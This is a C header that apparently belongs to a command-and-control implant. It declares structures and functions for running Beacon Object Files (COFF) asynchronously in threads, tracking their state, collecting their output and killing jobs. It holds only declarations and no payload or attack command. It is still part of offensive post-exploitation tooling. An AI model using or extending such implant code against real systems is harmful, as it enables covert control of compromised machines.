#pragma once
#ifndef ASYNCBOF_H
#define ASYNCBOF_H

#include <windows.h>
#include "Parser.h"
#include "Config.h"
#include "Tasks/InlineExecute.h"

#if defined(INCLUDE_CMD_ASYNC_EXECUTE) || defined(INCLUDE_CMD_JOBKILL) || defined(INCLUDE_CMD_JOBS)

#define ASYNC_BOF_STATE_PENDING  0x0
#define ASYNC_BOF_STATE_RUNNING  0x1
#define ASYNC_BOF_STATE_FINISHED 0x2
#define ASYNC_BOF_STATE_STOPPED  0x3

typedef struct _ASYNC_BOF_CONTEXT {
    CHAR  taskUuid[TASK_UUID_SIZE + 1];
    ULONG state;
    HANDLE hThread;
    DWORD  threadId;
    HANDLE hStopEvent;

    PBYTE coffFile;
    ULONG coffFileSize;
    PBYTE args;
    ULONG argsSize;
    PCHAR entryName;

    CRITICAL_SECTION outputLock;
    PCHAR outputBuffer;
    INT   outputSize;
    INT   outputOffset;
    BOOL  completedSent;

    COFF_RUNTIME_t coffRt;

    struct _ASYNC_BOF_CONTEXT* Next;
} ASYNC_BOF_CONTEXT, *PASYNC_BOF_CONTEXT;

extern __declspec(thread) PASYNC_BOF_CONTEXT tls_CurrentBofContext;
extern HANDLE g_AsyncBofWakeup;

BOOL  AsyncBofInitialize(void);
VOID  AsyncBofSignalWakeup(void);
BOOL  AsyncBofHasRunning(void);

PASYNC_BOF_CONTEXT AsyncBofFindByThreadId(DWORD threadId);
BOOL  AsyncBofRegisterThread(PASYNC_BOF_CONTEXT ctx, DWORD threadId);
VOID  AsyncBofUnregisterThread(DWORD threadId);

VOID  AsyncBofAppendOutput(PASYNC_BOF_CONTEXT ctx, PCHAR data, INT len);
PASYNC_BOF_CONTEXT AsyncBofGetOutputContext(void);

VOID  AsyncExecute(PCHAR taskUuid, PPARSER arguments);
VOID  AsyncBofJobKill(PCHAR taskUuid, PPARSER arguments);
VOID  AsyncBofJobs(PCHAR taskUuid, PPARSER arguments);
VOID  AsyncBofPush(void);

#endif /* async commands */

#endif /* ASYNCBOF_H */
